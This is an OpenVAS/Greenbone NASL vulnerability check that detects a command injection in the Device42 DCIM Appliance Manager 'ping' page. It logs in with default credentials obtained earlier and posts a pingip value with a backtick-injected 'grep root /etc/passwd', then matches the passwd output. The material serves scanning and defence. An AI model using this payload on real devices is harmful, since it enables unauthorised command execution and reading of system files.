# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105124");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:P/A:N");
  script_version("2023-07-26T05:05:09+0000");

  script_name("Device42 DCIM Appliance Manager 'ping' Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129279/Device42-Traceroute-Command-Injection.html");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to execute arbitrary
commands in the context of the affected device.");

  script_tag(name:"vuldetect", value:"Send a HTTP POST request using default credentials and check the response.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Device42 DCIM Appliance Manager is prone to a command-injection
vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-11-28 12:38:34 +0100 (Fri, 28 Nov 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_device42_appliance_managerdefault_credentials.nasl");
  script_require_ports("Services/www", 4242);
  script_mandatory_keys("device42/port", "device42/d42amid", "device42/csrf");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("device42/port");
if( ! port ) exit( 0 );

csrf = get_kb_item("device42/csrf");
if( ! csrf ) csrf = 'foo';

d42amid = get_kb_item("device42/d42amid");
if( ! d42amid ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name(port:port);

ex = 'csrfmiddlewaretoken=' + csrf + '&pingip=127.0.0.1%60grep+root+%2Fetc%2Fpasswd%60&ping=H';
len = strlen( ex );

req = 'POST /ping/ HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Referer: http://' + host + '/ping/\r\n' +
      'Cookie: csrftoken=' + csrf  + '; d42amid=' + d42amid + '\r\n' +
      'Connection: close\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      ex;
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( result =~ 'root:.*:0:[01]:' && "ping: unknown host" >< result )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );
